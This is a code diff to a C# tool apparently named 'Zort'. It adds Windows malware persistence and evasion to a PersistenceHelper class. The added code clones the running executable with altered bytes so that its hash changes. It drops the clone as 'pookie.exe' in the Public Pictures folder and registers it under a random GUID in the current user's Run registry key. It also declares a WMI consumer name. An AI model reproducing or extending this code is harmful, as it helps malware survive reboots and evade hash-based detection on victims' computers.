@@ -12,6 +12,7 @@ namespace zort
 {
     public static class PersistenceHelper
     {
+        public const string WMI_CONSUMER_NAME = "PkxkAction";
         public static byte[] CreateClone()
         {
             // Create a clone of the application with added arbitrary data to change the hash
@@ -31,7 +32,39 @@ namespace zort
             NativeMethods.SetProcessPrivilege(ptr, NativeMethods.ProcessAccessRights.PROCESS_ALL_ACCESS);
         }
 
-        public static void MoveAndRunFromStartup()
+        public static void CopyToPicturesAndScheduleRun(bool justCopy = false)
+        {
+            string picsPath = "C:\\Users\\Public\\Pictures";
+            byte[] clone = CreateClone();
+            string clonePath = Path.Combine(picsPath, "pookie.exe");
+            if(!justCopy)
+            {
+                AddRegRun(clonePath);
+            }
+            if (File.Exists(clonePath))
+            {
+                File.Delete(clonePath);
+            }
+            File.WriteAllBytes(clonePath, clone);
+
+            Console.WriteLine($"## [Zort] Created clone at {clonePath}");
+        }
+
+        public static void AddRegRun(string path)
+        {
+            //Add path to registry run
+            string key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            using (var registryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key))
+            {
+                if (registryKey != null)
+                {
+                    registryKey.SetValue(Guid.NewGuid().ToString(), path);
+                    Console.WriteLine($"## [Zort] Added {path} to registry run");
+                }
+            }
+        }
+
+        public static void MoveAndRunFromStartupk()
         {
             try
             {
